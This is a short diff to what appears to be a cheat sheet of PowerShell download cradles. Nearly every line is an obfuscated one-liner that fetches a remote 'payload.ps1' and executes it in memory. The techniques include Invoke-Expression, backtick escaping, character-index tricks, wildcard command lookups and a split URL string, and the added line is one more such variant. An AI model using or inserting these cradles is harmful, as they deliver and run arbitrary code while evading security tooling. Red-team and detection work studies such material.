@@ -7,6 +7,7 @@ ps> Invoke-Expression((New-Object Net.WebClient).DownloadString('https://server/
 ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
 ps> i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    )."do`wnLO`ADS`TRinG"(    "http://server/payload.ps1"   )
 ps> Invoke-Expression((.(Get-Command N*-O*)Net.WebClient).DownloadString('https://www.server/payload.ps1'))
+ps> i`Ex ( nE`w-`ObJect Ne`T.WEBCl`Ient  )."DowNlo`Ads`TRI`NG"(   "ht"+"tps://server/payload.ps1"  )
 
 # Windows PowerShell heavily obfuscated Cradle not proxy aware
 ps> Invoke-Expression((.(Get-Command N*-O*)Net.WebClient).(((((.(Get-Command N*-O*)Net.WebClient)).PsObject.Methods)|Where-Object{(Get-Variable _ -Value).Name-clike'*wn*d*g'}).Name).Invoke('https://www.server/payload.ps1'))
